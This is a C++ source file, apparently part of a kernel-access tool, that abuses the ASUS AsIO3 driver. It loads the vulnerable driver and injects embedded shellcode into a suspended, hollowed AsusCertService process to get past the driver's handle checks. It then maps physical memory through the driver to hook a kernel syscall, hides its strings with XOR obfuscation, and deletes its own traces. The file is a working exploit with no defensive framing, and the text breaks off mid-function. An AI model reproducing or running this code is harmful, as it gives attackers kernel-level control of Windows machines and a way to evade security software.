#include "asio3_interface.h"
#include "asio3_raw_bytes.h"

#include <fstream>
#include <vector>
#include <filesystem>

#include <psapi.h>
#include <tlhelp32.h>

#include <ntstatus.h>

#include <thread>
#include <chrono>

#pragma warning(disable:4996)

asio3_interface _driver_asio3;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;


const std::vector<BYTE> asio_shellcode = {
    0x55, 0x8B, 0xEC, 0x83, 0xE4, 0xF0, 0x64, 0xA1, 0x30, 0x00,
    0x00, 0x00, 0x81, 0xEC, 0xA8, 0x00, 0x00, 0x00, 0x8B, 0x40,
    0x0C, 0x56, 0x57, 0x8B, 0x40, 0x0C, 0x8B, 0x00, 0x8B, 0x50,
    0x18, 0xB8, 0x4D, 0x5A, 0x00, 0x00, 0x66, 0x39, 0x02, 0x0F,
    0x85, 0x6C, 0x04, 0x00, 0x00, 0x8D, 0x42, 0x3C, 0x89, 0x44,
    0x24, 0x10, 0x8B, 0x00, 0x81, 0x3C, 0x10, 0x50, 0x45, 0x00,
    0x00, 0x74, 0x0F, 0x33, 0xC0, 0x89, 0x44, 0x24, 0x2C, 0x89,
    0x44, 0x24, 0x24, 0xE9, 0x15, 0x01, 0x00, 0x00, 0x8B, 0x44,
    0x10, 0x78, 0x03, 0xC2, 0x8B, 0x78, 0x24, 0x8B, 0x48, 0x20,
    0x03, 0xFA, 0x8B, 0x70, 0x1C, 0x03, 0xCA, 0x8B, 0x40, 0x18,
    0x03, 0xF2, 0x89, 0x7C, 0x24, 0x14, 0x33, 0xFF, 0x89, 0x4C,
    0x24, 0x24, 0x89, 0x74, 0x24, 0x10, 0x89, 0x44, 0x24, 0x18,
    0x85, 0xC0, 0x74, 0x4F, 0x0F, 0x1F, 0x40, 0x00, 0x8B, 0x44,
    0x24, 0x14, 0x8B, 0x0C, 0xB9, 0x03, 0xCA, 0x0F, 0xB7, 0x04,
    0x78, 0x8B, 0x04, 0x86, 0x33, 0xF6, 0x03, 0xC2, 0x89, 0x44,
    0x24, 0x2C, 0x8A, 0x01, 0x84, 0xC0, 0x74, 0x1C, 0x66, 0x90,
    0x0F, 0xBE, 0xC0, 0x8D, 0x49, 0x01, 0x33, 0xF0, 0x8A, 0x01,
    0xC1, 0xC6, 0x03, 0x46, 0x84, 0xC0, 0x75, 0xEE, 0x81, 0xFE,
    0x3E, 0x67, 0x51, 0xCD, 0x74, 0x17, 0x47, 0x3B, 0x7C, 0x24,
    0x18, 0x73, 0x0A, 0x8B, 0x4C, 0x24, 0x24, 0x8B, 0x74, 0x24,
    0x10, 0xEB, 0xB5, 0x33, 0xC0, 0x89, 0x44, 0x24, 0x2C, 0x8D,
    0x42, 0x3C, 0x89, 0x44, 0x24, 0x10, 0x8B, 0x00, 0x03, 0xC2,
    0x8B, 0x40, 0x78, 0x03, 0xC2, 0x8B, 0x78, 0x24, 0x8B, 0x48,
    0x20, 0x03, 0xFA, 0x8B, 0x70, 0x1C, 0x03, 0xCA, 0x8B, 0x40,
    0x18, 0x03, 0xF2, 0x89, 0x7C, 0x24, 0x14, 0x33, 0xFF, 0x89,
    0x4C, 0x24, 0x1C, 0x89, 0x74, 0x24, 0x20, 0x89, 0x44, 0x24,
    0x18, 0x85, 0xC0, 0x74, 0x52, 0x0F, 0x1F, 0x80, 0x00, 0x00,
    0x00, 0x00, 0x8B, 0x44, 0x24, 0x14, 0x0F, 0xB7, 0x04, 0x78,
    0x8B, 0x04, 0x86, 0x33, 0xF6, 0x03, 0xC2, 0x89, 0x44, 0x24,
    0x24, 0x8B, 0x04, 0xB9, 0x8A, 0x0C, 0x10, 0x03, 0xC2, 0x84,
    0xC9, 0x74, 0x1B, 0x90, 0x0F, 0xBE, 0xC9, 0x8D, 0x40, 0x01,
    0x33, 0xF1, 0x8A, 0x08, 0xC1, 0xC6, 0x03, 0x46, 0x84, 0xC9,
    0x75, 0xEE, 0x81, 0xFE, 0x4A, 0xBC, 0xE2, 0x71, 0x74, 0x19,
    0x47, 0x3B, 0x7C, 0x24, 0x18, 0x73, 0x0A, 0x8B, 0x4C, 0x24,
    0x1C, 0x8B, 0x74, 0x24, 0x20, 0xEB, 0xB5, 0xC7, 0x44, 0x24,
    0x24, 0x00, 0x00, 0x00, 0x00, 0x8B, 0x44, 0x24, 0x10, 0x8B,
    0x00, 0x81, 0x3C, 0x10, 0x50, 0x45, 0x00, 0x00, 0x75, 0x79,
    0x8B, 0x44, 0x10, 0x78, 0x03, 0xC2, 0x8B, 0x78, 0x24, 0x8B,
    0x48, 0x20, 0x03, 0xFA, 0x8B, 0x70, 0x1C, 0x03, 0xCA, 0x8B,
    0x40, 0x18, 0x03, 0xF2, 0x89, 0x7C, 0x24, 0x20, 0x33, 0xFF,
    0x89, 0x4C, 0x24, 0x14, 0x89, 0x74, 0x24, 0x28, 0x89, 0x44,
    0x24, 0x1C, 0x85, 0xC0, 0x74, 0x4B, 0x8B, 0x44, 0x24, 0x20,
    0x8B, 0x0C, 0xB9, 0x03, 0xCA, 0x0F, 0xB7, 0x04, 0x78, 0x8B,
    0x04, 0x86, 0x33, 0xF6, 0x03, 0xC2, 0x89, 0x44, 0x24, 0x18,
    0x8A, 0x01, 0x84, 0xC0, 0x74, 0x1C, 0x66, 0x90, 0x0F, 0xBE,
    0xC0, 0x8D, 0x49, 0x01, 0x33, 0xF0, 0x8A, 0x01, 0xC1, 0xC6,
    0x03, 0x46, 0x84, 0xC0, 0x75, 0xEE, 0x81, 0xFE, 0x8E, 0x2E,
    0x4C, 0xC2, 0x74, 0x19, 0x47, 0x3B, 0x7C, 0x24, 0x1C, 0x73,
    0x0A, 0x8B, 0x4C, 0x24, 0x14, 0x8B, 0x74, 0x24, 0x28, 0xEB,
    0xB5, 0xC7, 0x44, 0x24, 0x18, 0x00, 0x00, 0x00, 0x00, 0x8B,
    0x44, 0x24, 0x10, 0x8B, 0x00, 0x81, 0x3C, 0x10, 0x50, 0x45,
    0x00, 0x00, 0x75, 0x79, 0x8B, 0x44, 0x10, 0x78, 0x03, 0xC2,
    0x8B, 0x78, 0x24, 0x8B, 0x48, 0x20, 0x03, 0xFA, 0x8B, 0x70,
    0x1C, 0x03, 0xCA, 0x8B, 0x40, 0x18, 0x03, 0xF2, 0x89, 0x7C,
    0x24, 0x28, 0x33, 0xFF, 0x89, 0x4C, 0x24, 0x1C, 0x89, 0x74,
    0x24, 0x30, 0x89, 0x44, 0x24, 0x20, 0x85, 0xC0, 0x74, 0x4B,
    0x8B, 0x44, 0x24, 0x28, 0x8B, 0x0C, 0xB9, 0x03, 0xCA, 0x0F,
    0xB7, 0x04, 0x78, 0x8B, 0x04, 0x86, 0x33, 0xF6, 0x03, 0xC2,
    0x89, 0x44, 0x24, 0x14, 0x8A, 0x01, 0x84, 0xC0, 0x74, 0x1C,
    0x66, 0x90, 0x0F, 0xBE, 0xC0, 0x8D, 0x49, 0x01, 0x33, 0xF0,
    0x8A, 0x01, 0xC1, 0xC6, 0x03, 0x46, 0x84, 0xC0, 0x75, 0xEE,
    0x81, 0xFE, 0x0A, 0xD8, 0xCC, 0x47, 0x74, 0x19, 0x47, 0x3B,
    0x7C, 0x24, 0x20, 0x73, 0x0A, 0x8B, 0x4C, 0x24, 0x1C, 0x8B,
    0x74, 0x24, 0x30, 0xEB, 0xB5, 0xC7, 0x44, 0x24, 0x14, 0x00,
    0x00, 0x00, 0x00, 0x8B, 0x44, 0x24, 0x10, 0x8B, 0x00, 0x81,
    0x3C, 0x10, 0x50, 0x45, 0x00, 0x00, 0x75, 0x7F, 0x8B, 0x44,
    0x10, 0x78, 0x03, 0xC2, 0x8B, 0x78, 0x24, 0x8B, 0x48, 0x20,
    0x03, 0xFA, 0x8B, 0x70, 0x1C, 0x03, 0xCA, 0x8B, 0x40, 0x18,
    0x03, 0xF2, 0x89, 0x7C, 0x24, 0x30, 0x33, 0xFF, 0x89, 0x4C,
    0x24, 0x20, 0x89, 0x74, 0x24, 0x1C, 0x89, 0x44, 0x24, 0x28,
    0x85, 0xC0, 0x74, 0x51, 0x8B, 0x44, 0x24, 0x30, 0x8B, 0x0C,
    0xB9, 0x03, 0xCA, 0x0F, 0xB7, 0x04, 0x78, 0x8B, 0x04, 0x86,
    0x33, 0xF6, 0x03, 0xC2, 0x89, 0x44, 0x24, 0x10, 0x8A, 0x01,
    0x84, 0xC0, 0x74, 0x1C, 0x66, 0x90, 0x0F, 0xBE, 0xC0, 0x8D,
    0x49, 0x01, 0x33, 0xF0, 0x8A, 0x01, 0xC1, 0xC6, 0x03, 0x46,
    0x84, 0xC0, 0x75, 0xEE, 0x81, 0xFE, 0xD6, 0x6B, 0x6D, 0xD7,
    0x74, 0x11, 0x47, 0x3B, 0x7C, 0x24, 0x28, 0x73, 0x10, 0x8B,
    0x4C, 0x24, 0x20, 0x8B, 0x74, 0x24, 0x1C, 0xEB, 0xB5, 0x8B,
    0x74, 0x24, 0x10, 0xEB, 0x02, 0x33, 0xF6, 0x8B, 0x44, 0x24,
    0x2C, 0x85, 0xC0, 0x0F, 0x84, 0x7A, 0x01, 0x00, 0x00, 0x83,
    0x7C, 0x24, 0x24, 0x00, 0x0F, 0x84, 0x6F, 0x01, 0x00, 0x00,
    0x83, 0x7C, 0x24, 0x18, 0x00, 0x0F, 0x84, 0x64, 0x01, 0x00,
    0x00, 0x8B, 0x7C, 0x24, 0x14, 0x85, 0xFF, 0x0F, 0x84, 0x58,
    0x01, 0x00, 0x00, 0x85, 0xF6, 0x0F, 0x84, 0x50, 0x01, 0x00,
    0x00, 0x33, 0xC9, 0xC7, 0x44, 0x24, 0x38, 0x5C, 0x00, 0x44,
    0x00, 0x66, 0x89, 0x4C, 0x24, 0x58, 0x8D, 0x4C, 0x24, 0x38,
    0x51, 0x8D, 0x8C, 0x24, 0x84, 0x00, 0x00, 0x00, 0xC7, 0x44,
    0x24, 0x40, 0x65, 0x00, 0x76, 0x00, 0x51, 0xC7, 0x44, 0x24,
    0x48, 0x69, 0x00, 0x63, 0x00, 0xC7, 0x44, 0x24, 0x4C, 0x65,
    0x00, 0x5C, 0x00, 0xC7, 0x44, 0x24, 0x50, 0x41, 0x00, 0x73,
    0x00, 0xC7, 0x44, 0x24, 0x54, 0x75, 0x00, 0x73, 0x00, 0xC7,
    0x44, 0x24, 0x58, 0x67, 0x00, 0x69, 0x00, 0xC7, 0x44, 0x24,
    0x5C, 0x6F, 0x00, 0x33, 0x00, 0xFF, 0xD0, 0x6A, 0x00, 0x6A,
    0x00, 0x6A, 0x00, 0x6A, 0x01, 0x6A, 0x00, 0x6A, 0x00, 0x8D,
    0x84, 0x24, 0x98, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x4C,
    0xFF, 0xFF, 0xFF, 0xFF, 0x89, 0x84, 0x24, 0x88, 0x00, 0x00,
    0x00, 0x8D, 0x84, 0x24, 0xA0, 0x00, 0x00, 0x00, 0x6A, 0x00,
    0x50, 0x8D, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0xC7, 0x84,
    0x24, 0x88, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00, 0x50,
    0x68, 0x00, 0x00, 0x00, 0xC0, 0x8D, 0x44, 0x24, 0x5C, 0xC7,
    0x84, 0x24, 0x94, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x50, 0xC7, 0x84, 0x24, 0xA0, 0x00, 0x00, 0x00, 0x40, 0x00,
    0x00, 0x00, 0xC7, 0x84, 0x24, 0xA4, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0xC7, 0x84, 0x24, 0xA8, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0xFF, 0x54, 0x24, 0x50, 0x85, 0xC0,
    0x78, 0x7D, 0x8D, 0x44, 0x24, 0x5C, 0xC7, 0x44, 0x24, 0x5C,
    0x00, 0x00, 0x00, 0x00, 0x50, 0x6A, 0x18, 0x8D, 0x84, 0x24,
    0x98, 0x00, 0x00, 0x00, 0x0F, 0x57, 0xC0, 0x50, 0x6A, 0x00,
    0x6A, 0xFF, 0x0F, 0x29, 0x84, 0x24, 0xA4, 0x00, 0x00, 0x00,
    0x66, 0x0F, 0xD6, 0x84, 0x24, 0xB4, 0x00, 0x00, 0x00, 0xFF,
    0xD7, 0x85, 0xC0, 0x78, 0x48, 0x8B, 0x84, 0x24, 0xA4, 0x00,
    0x00, 0x00, 0x6A, 0x04, 0x89, 0x44, 0x24, 0x68, 0x8D, 0x44,
    0x24, 0x64, 0x50, 0x6A, 0x04, 0x8D, 0x44, 0x24, 0x70, 0xC7,
    0x44, 0x24, 0x6C, 0x00, 0x00, 0x00, 0x00, 0x50, 0x68, 0x90,
    0xA4, 0x40, 0xA0, 0x8D, 0x84, 0x24, 0x9C, 0x00, 0x00, 0x00,
    0x50, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0xFF, 0x74, 0x24,
    0x58, 0xFF, 0x54, 0x24, 0x40, 0x6A, 0x00, 0x6A, 0xFF, 0xFF,
    0xD6, 0x5F, 0x5E, 0x8B, 0xE5, 0x5D, 0xC3, 0x5F, 0x33, 0xC0,
    0x5E, 0x8B, 0xE5, 0x5D, 0xC3,
};

bool asio3_interface::bypass_handle_protection()
{
    auto save_to_file = [](const std::string& name, const std::vector<BYTE>& data) {
        std::ofstream outfile(name, std::ios::out | std::ios::binary);
        outfile.write(reinterpret_cast<const char*>(data.data()), data.size());
        outfile.close();
    };

    auto get_temp_directory = []() -> std::string
    {
        char temp_path[MAX_PATH];
        if (GetTempPathA(sizeof(temp_path), temp_path) == 0) {
            return "";
        }
        return std::string(temp_path);
    };

    auto check_for_existing_cert_service = [](std::string* out_path) -> bool
    {
        const std::string asus_defualt_path = XorString("C:\\Program Files (x86)\\ASUS\\AsusCertService\\AsusCertService.exe");

        if (std::filesystem::exists(asus_defualt_path))
        {
            *out_path = asus_defualt_path;
            return true;
        }
        
        //If we can't locate it with default path, lets check for running processes
        HANDLE process_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

        if (process_snapshot && process_snapshot != INVALID_HANDLE_VALUE)
        {
            PROCESSENTRY32 proc_entry = { 0 };
            proc_entry.dwSize = sizeof(PROCESSENTRY32);

            std::string result_path = "";
            if (Process32First(process_snapshot, &proc_entry))
            {
                do
                {
                    std::string process_name = proc_entry.szExeFile;

                    if (strcmp(process_name.c_str(), XorString("AsusCertService.exe")) == 0)
                    {
                        HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, NULL, proc_entry.th32ProcessID);

                        if (hProc && hProc != INVALID_HANDLE_VALUE)
                        {
                            char file_path[MAX_PATH + 1] = { 0 };
                            if (K32GetModuleFileNameExA(hProc, NULL, file_path, MAX_PATH + 1))
                            {
                                result_path = file_path;
                                CloseHandle(hProc);
                                break;
                            }
                            CloseHandle(hProc);
                        }
                    }
                   

                } while (Process32Next(process_snapshot, &proc_entry));
            }
            CloseHandle(process_snapshot);

            if (result_path.length() > 1)
            {
                *out_path = result_path;
                return true;
            }
        }

        return false;
    };

    std::string hollow_proc_name = "";

    //If we loaded our own driver we use our own cert bypass, if we didn't load one, we use an existing one
    if (this->driver_load_performed)
    {
        hollow_proc_name = get_temp_directory() + XorString("cert_service.exe");
        save_to_file(hollow_proc_name, asio3_raw::asus_cert_service);
    }
    else
    {
       // hollow_proc_name = get_temp_directory() + XorString("cert_service.exe");
        //save_to_file(hollow_proc_name, asio3_raw::asus_cert_service);
        if (check_for_existing_cert_service(&hollow_proc_name))
        {
            printf("Hijacking file at (%s)\n", hollow_proc_name.c_str());
        }
        else
        {
            printf("Failed locating original cert service!\n");
            return false;
        }
    }


    if (!std::filesystem::exists(hollow_proc_name))
    {
        printf("Failed creating service executable\n");
        return false;
    }

    STARTUPINFOA startupInfo = { sizeof(startupInfo) };
    PROCESS_INFORMATION processInfo;
    if (!CreateProcessA(hollow_proc_name.c_str(), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &startupInfo, &processInfo))
    {
        printf("Failed creating suspeneded process\n");
        std::filesystem::remove(hollow_proc_name);
        return false;
    }

    WOW64_CONTEXT thread_ctx = { 0 };
    thread_ctx.ContextFlags = WOW64_CONTEXT_INTEGER;
    if (!Wow64GetThreadContext(processInfo.hThread, &thread_ctx))
    {
        printf("Wow64GetThreadContext Failed\n");
        std::filesystem::remove(hollow_proc_name);
        //std::filesystem::remove(bypass_file_name);
        return false;
    }
   
  /*  const std::vector<BYTE> spinlock_shell = { 0xEB, 0xFE };

    DWORD old_prot = NULL;
    VirtualProtectEx(processInfo.hProcess, reinterpret_cast<LPVOID>(thread_ctx.Eax), spinlock_shell.size(), PAGE_EXECUTE_READWRITE, &old_prot);
    WriteProcessMemory(processInfo.hProcess, reinterpret_cast<LPVOID>(thread_ctx.Eax), spinlock_shell.data(), spinlock_shell.size(), nullptr);
    VirtualProtectEx(processInfo.hProcess, reinterpret_cast<LPVOID>(thread_ctx.Eax), spinlock_shell.size(), old_prot, &old_prot);*/

    //Allocate place for new shellcode
    PVOID allocation = VirtualAllocEx(processInfo.hProcess, nullptr, asio_shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!allocation)
    {
        printf("VirtualAllocEx Failed\n");
        return false;
    }

    if (!WriteProcessMemory(processInfo.hProcess, allocation, asio_shellcode.data(), asio_shellcode.size(), nullptr))
    {
        printf("WriteProcessMemory Failed\n");
        return false;
    }




    //thread_ctx.Ebx = reinterpret_cast<ULONG64>(module_base) + entry_point_off;
    thread_ctx.Eax = (ULONG)allocation;
    thread_ctx.ContextFlags = WOW64_CONTEXT_INTEGER;
    if (!Wow64SetThreadContext(processInfo.hThread, &thread_ctx))
    {
        printf("Wow64SetThreadContext Failed\n");
        return false;
    }
    
    ResumeThread(processInfo.hThread);

    //We wait here so we give the new thread some time to start
    std::this_thread::sleep_for(std::chrono::seconds(1));

   
    DWORD dwExitCode;
    //Wait until shellcode executes and exits
    if (WaitForSingleObject(processInfo.hProcess, INFINITE) == WAIT_OBJECT_0 &&
        GetExitCodeProcess(processInfo.hProcess, &dwExitCode))
    {
        // The process has exited. You can do something here, like log the exit code.
        if (this->driver_load_performed)
            std::filesystem::remove(hollow_proc_name);
       // std::filesystem::remove(bypass_file_name);
        CloseHandle(processInfo.hThread);
        CloseHandle(processInfo.hProcess);
        return true;
    }
    else
    {
        printf("WaitForSingleObject Failed\n");
        // Failed to wait for the process to exit.
        if (this->driver_load_performed)
            std::filesystem::remove(hollow_proc_name);
        //std::filesystem::remove(bypass_file_name);
        CloseHandle(processInfo.hThread);
        CloseHandle(processInfo.hProcess);
        return false;
    }
}

bool asio3_interface::map_syscall()
{
    this->syscall_page_offset = reinterpret_cast<ULONG>(
        this->get_kernel_export(XorString("ntoskrnl.exe"), XorString("NtShutdownSystem"), true));

    if (!this->syscall_page_offset)
    {
        printf("get_kernel_export failed!\n");
        return false;
    }
    ULONG syscall_rva = this->syscall_page_offset;

    constexpr ULONG PAGE_SIZE = 0x1000;
    this->syscall_page_offset = this->syscall_page_offset % PAGE_SIZE;

    HMODULE ntoskrnl_local_buffer = (LoadLibraryExA(XorString("ntoskrnl.exe"), NULL, DONT_RESOLVE_DLL_REFERENCES));

    if (!ntoskrnl_local_buffer)
    {
        printf("Locating local ntos failed!\n");
        return false;
    }

    this->syscall_bytes.reserve(64); this->syscall_bytes.resize(64);

    memcpy(this->syscall_bytes.data(), reinterpret_cast<PVOID>((ULONG64)ntoskrnl_local_buffer + syscall_rva), this->syscall_bytes.size());

    std::vector<std::pair<ULONG64, ULONG>> phys_mem_ranges = this->get_physical_mem_ranges();

    if (!phys_mem_ranges.size())
    {
        printf("Locating phys_mem_ranges failed!\n");
        return false;
    }
    for (auto& range : phys_mem_ranges)
    {
        this->physmeme_map_syscall(range.first, range.second);
    }

    if (!this->syscall_located.load())
    {
        printf("Failed mapping syscall\n");
        return false;
    }

    return true;
}

bool asio3_interface::initialize_interface()
{
    if (this->device_handle)
        return true;

    if (!SysCallData.NtShutdownSystem)
    {
        if (!InitSyscalls(&SysCallData))
        {
            printf("Failed initializing syscalls!\n");
            return false;
        }
    }

    this->device_handle = CreateFileA(this->symbolic_link.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);

    DWORD last_error = GetLastError();
    if ((!this->device_handle || this->device_handle == INVALID_HANDLE_VALUE) && last_error == ERROR_ACCESS_DENIED)
    {
        //Driver already loaded
        printf("Driver already loaded! Using default driver\n");
    }
    else
    {
        //Driver not loaded
        if (!this->load_driver(&this->driver_name))
        {
            printf("Failed loading driver :(\n");
            return false;
        }

        this->driver_load_performed = true;
    }

    if (!this->bypass_handle_protection())
    {
        printf("Critical error #1\n");
        return false;
    }

    this->device_handle = CreateFileA(this->symbolic_link.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);

    if (!this->device_handle || this->device_handle == INVALID_HANDLE_VALUE)
    {
        printf("Critical error #2\n");
        return false;
    }

    if (!this->map_syscall())
    {
        printf("Critical error #3\n");
        return false;
    }

    return true;
}

bool asio3_interface::unload_driver(std::string& driver_name)
{
    const DWORD SeLoadDriverPrivilege = 10ull;

    if (!asio3_utils::acquire_privilege(SeLoadDriverPrivilege))
    {
        printf(XorString("[nvoclk] Failed acquiring required privileges.\n"));
    }

    std::wstring u_driver_name(driver_name.begin(), driver_name.end());
    
    std::wstring source_registry = std::wstring(L"\\registry\\machine\\SYSTEM\\CurrentControlSet\\Services\\") + u_driver_name;

    UNICODE_STRING unicode_buffer = { 0,0,0 };
    asio3_utils::InitUnicodeString(&unicode_buffer, source_registry.c_str());

    NTSTATUS status = do_syscall<NTSTATUS>(SysCallData.NtUnloadDriver, &unicode_buffer);
    //NTSTATUS status = WinApi.NtUnloadDriver(&unicode_buffer);

    if (status != STATUS_SUCCESS && status != STATUS_OBJECT_NAME_NOT_FOUND)
    {
        //printf(XorString("[nvoclk] Failed unloading driver. Is the unload routine patched? (0x%llX)\n"), status);
       // printf(XorString("[nvoclk] Please manually delete file '%wS.sys' from System32\\Drivers after reboot\n"), u_driver_name.c_str());
        return false;
    }

    if (!asio3_utils::registry_remove_service(u_driver_name.c_str()))
    {
        //printf(XorString("[nvoclk] Failed removing driver service from registry\n"));
        return false;
    }

   // printf(XorString("[nvoclk] Driver entry from registry cleared\n"));

    std::string full_driver_path = asio3_utils::get_sys_driver_path() + driver_name + XorString(".sys");

    if (!std::filesystem::remove(full_driver_path))
    {
       // printf(XorString("[nvoclk] Failed deleting temp driver file\n"));
        return false;
    }

    return true;
}

bool asio3_interface::on_exit()
{
    if (device_handle) {
        CloseHandle(device_handle);
    }
    if (this->driver_load_performed)
    {
        this->unload_driver(this->driver_name);
        this->driver_load_performed = false;
    }
    return true;
}

std::vector<std::pair<ULONG64, ULONG>> asio3_interface::get_physical_mem_ranges()
{
    static std::vector<std::pair<ULONG64, ULONG>> ranges;

    if (ranges.size() > 0)
        return ranges;

    HKEY h_key;
    DWORD type, size;
    LPBYTE data;
    RegOpenKeyExA(HKEY_LOCAL_MACHINE, XorString("HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory"), 0, KEY_READ, &h_key);
    RegQueryValueExA(h_key, XorString(".Translated"), NULL, &type, NULL, &size); //get size
    data = new BYTE[size];
    RegQueryValueExA(h_key, XorString(".Translated"), NULL, &type, data, &size);
    DWORD count = *(DWORD*)(data + 16);
    auto pmi = data + 24;
    for (int dwIndex = 0; dwIndex < count; dwIndex++)
    {
        ranges.push_back({ *(ULONG64*)(pmi + 0), *(ULONG64*)(pmi + 8) });
        pmi += 20;
    }
    delete[] data;
    RegCloseKey(h_key);
    return ranges;
}

PVOID asio3_interface::get_kernel_export(const char* module_name, const char* export_name, bool rva)
{
    typedef struct _RTL_PROCESS_MODULE_INFORMATION
    {
        HANDLE Section;
        PVOID MappedBase;
        PVOID ImageBase;
        ULONG ImageSize;
        ULONG Flags;
        USHORT LoadOrderIndex;
        USHORT InitOrderIndex;
        USHORT LoadCount;
        USHORT OffsetToFileName;
        UCHAR FullPathName[256];
    } RTL_PROCESS_MODULE_INFORMATION, * PRTL_PROCESS_MODULE_INFORMATION;

    typedef struct _RTL_PROCESS_MODULES
    {
        ULONG NumberOfModules;
        RTL_PROCESS_MODULE_INFORMATION Modules[1];
    } RTL_PROCESS_MODULES, * PRTL_PROCESS_MODULES;

    void* buffer = nullptr;
    DWORD buffer_size = NULL;

    typedef NTSTATUS(WINAPI* PFN_NT_QUERY_SYSTEM_INFORMATION)(
        _In_ int SystemInformationClass,
        _Out_ PVOID SystemInformation,
        _In_ ULONG SystemInformationLength,
        _Out_opt_ PULONG ReturnLength
        );

    static PFN_NT_QUERY_SYSTEM_INFORMATION pfnNtQuerySystemInformation = (PFN_NT_QUERY_SYSTEM_INFORMATION)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    
    constexpr int SystemModuleInformation = 0x0B;
    NTSTATUS status = pfnNtQuerySystemInformation(
        SystemModuleInformation,
        buffer,
        buffer_size,
        &buffer_size
    );

    while (status == STATUS_INFO_LENGTH_MISMATCH)
    {
        VirtualFree(buffer, 0, MEM_RELEASE);
        buffer = VirtualAlloc(nullptr, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        status = pfnNtQuerySystemInformation(
           SystemModuleInformation,
            buffer,
            buffer_size,
            &buffer_size
        );
    }

    if ((status != STATUS_SUCCESS))
    {
        VirtualFree(buffer, 0, MEM_RELEASE);
        return 0;
    }

    const auto modules = static_cast<PRTL_PROCESS_MODULES>(buffer);
    for (auto idx = 0u; idx < modules->NumberOfModules; ++idx)
    {
        // find module and then load library it
        const std::string current_module_name =
            std::string(reinterpret_cast<char*>(
                modules->Modules[idx].FullPathName) +
                modules->Modules[idx].OffsetToFileName
            );

        if (!_stricmp(current_module_name.c_str(), module_name))
        {
            // had to shoot the tires off of "\\SystemRoot\\"
            std::string full_path = reinterpret_cast<char*>(modules->Modules[idx].FullPathName);
            full_path.replace(
                full_path.find(XorString("\\SystemRoot\\")),
                sizeof(XorString("\\SystemRoot\\")) - 1,
                std::string(getenv(XorString("SYSTEMROOT"))).append("\\")
            );

            const auto module_base =
                LoadLibraryEx(
                    full_path.c_str(),
                    NULL,
                    DONT_RESOLVE_DLL_REFERENCES
                );

            PIMAGE_DOS_HEADER p_idh;
            PIMAGE_NT_HEADERS p_inh;
            PIMAGE_EXPORT_DIRECTORY p_ied;

            PDWORD addr, name;
            PWORD ordinal;

            p_idh = (PIMAGE_DOS_HEADER)module_base;
            if (p_idh->e_magic != IMAGE_DOS_SIGNATURE)
                return NULL;

            p_inh = (PIMAGE_NT_HEADERS)((LPBYTE)module_base + p_idh->e_lfanew);
            if (p_inh->Signature != IMAGE_NT_SIGNATURE)
                return NULL;

            if (p_inh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0)
                return NULL;

            p_ied = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)module_base +
                p_inh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

            addr = (PDWORD)((LPBYTE)module_base + p_ied->AddressOfFunctions);
            name = (PDWORD)((LPBYTE)module_base + p_ied->AddressOfNames);
            ordinal = (PWORD)((LPBYTE)module_base + p_ied->AddressOfNameOrdinals);

            // find exported function
            for (auto i = 0; i < p_ied->AddressOfFunctions; i++)
                if (!strcmp(export_name, (char*)module_base + name[i]))
                {
                    if (!rva)
                    {
                        auto result = (void*)((std::uintptr_t)modules->Modules[idx].ImageBase + addr[ordinal[i]]);
                        VirtualFree(buffer, NULL, MEM_RELEASE);
                        return result;
                    }
                    else
                    {
                        auto result = (void*)addr[ordinal[i]];
                        VirtualFree(buffer, NULL, MEM_RELEASE);
                        return result;
                    }
                }
        }
    }
    VirtualFree(buffer, NULL, MEM_RELEASE);
    return NULL;
}

PVOID asio3_interface::map_phys_memory_x64(const ULONG64& start, const ULONG64& size, asio3_info::structures::_IOCTL_MAP_UNMAP_PHYS_MEMORY_X64* out_info)
{
    if (!this->device_handle || !out_info)
        return nullptr;

    asio3_info::structures::_IOCTL_MAP_UNMAP_PHYS_MEMORY_X64 buffer = { 0 };

    buffer.phys_address.QuadPart = start;
    buffer.section_size = size;

    DWORD bytesReturned = NULL;
    BOOL result = sDeviceIoControl(this->device_handle, asio3_info::io_control_code::IOCTL_MAP_PHYS_MEMORY,
        &buffer, sizeof(buffer), &buffer, sizeof(buffer), &bytesReturned, NULL);

    if (!result || !buffer.out_mapped_address)
        return nullptr;

    *out_info = buffer;

    return reinterpret_cast<PVOID>(buffer.out_mapped_address);
}

BOOL asio3_interface::unmap_phys_memory_x64(asio3_info::structures::_IOCTL_MAP_UNMAP_PHYS_MEMORY_X64* p_info)
{
    if (!this->device_handle || !p_info || !p_info->out_mapped_address)
        return false;

    constexpr SIZE_T request_size = sizeof(asio3_info::structures::_IOCTL_MAP_UNMAP_PHYS_MEMORY_X64);

    DWORD bytesReturned = NULL;
    BOOL result = sDeviceIoControl(this->device_handle, asio3_info::io_control_code::IOCTL_UNMAP_PHYS_MEMORY,
        p_info, request_size, p_info, request_size, &bytesReturned, NULL);

    if (!result)
        return false;

    return true;
}

ULONG64 asio3_interface::map_phys_memory_x32(const ULONG64& start, const ULONG& size)
{
